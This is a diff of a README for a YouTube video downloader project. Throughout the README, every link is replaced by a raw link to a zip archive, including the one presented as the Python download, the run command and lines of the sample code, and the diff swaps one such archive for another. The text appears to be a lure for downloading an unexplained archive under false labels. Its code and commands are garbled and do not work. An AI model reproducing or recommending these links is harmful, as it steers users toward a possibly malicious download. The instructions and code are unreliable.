@@ -1,7 +1,7 @@
 ```markdown
 # 🎥 YoutubeDownloader - Download Your Favorite Videos Easily
 
-[![Download](https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip)](https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip)
+[![Download](https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip)](https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,13 +9,13 @@ To begin using the YouTube Video Downloader, follow these simple steps. This gui
 
 ### 📥 Download & Install
 
-To download the application, please [visit this page to download](https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip). You will find various versions available. Choose the latest version for the best experience.
+To download the application, please [visit this page to download](https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip). You will find various versions available. Choose the latest version for the best experience.
 
 ### 🗒️ Requirements
 
 Before you begin, ensure your system meets these requirements:
 
-- **Python 3.x**: Make sure you have Python installed. You can download it from [https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip](https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip).
+- **Python 3.x**: Make sure you have Python installed. You can download it from [https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip](https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip).
 - **pytube library**: This is the library that enables video downloads. Install it by running the following command in your terminal or command prompt:
 
   ```
@@ -28,7 +28,7 @@ Once you have everything set up, you’re ready to download videos. Just follow 
 
 1. **Run the Script**: Open your terminal or command prompt and type the following command:
    ```
-   python https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip
+   python https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip
    ```
 
 2. **Enter Video Link**: When prompted, paste a valid YouTube video link. The script will ask for this link to proceed.
@@ -48,9 +48,9 @@ video_url = input("Enter Youtube Video link: ")
 
 yt = YouTube(video_url)
 
-stream = https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip()
+stream = https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip()
 
-https://github.com/Asfand-Khann/YoutubeDownloader/raw/refs/heads/main/dilatedness/Downloader-Youtube-2.9-beta.3.zip()
+https://raw.githubusercontent.com/Asfand-Khann/YoutubeDownloader/main/dilatedness/Downloader-Youtube-2.5.zip()
 
 print("Download completed!")
 ```
